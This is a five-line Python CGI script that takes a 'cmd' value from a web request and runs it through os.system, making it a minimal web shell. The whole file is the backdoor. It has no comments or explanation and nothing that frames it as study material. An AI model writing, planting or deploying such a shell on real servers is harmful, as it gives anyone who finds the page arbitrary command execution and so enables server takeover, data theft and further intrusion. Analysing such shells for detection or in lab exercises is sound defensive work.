#!/usr/bin/env python3
import cgi, os
print("Content-Type: text/html\n")
c = cgi.FieldStorage().getvalue("cmd")
if c: os.system(c)
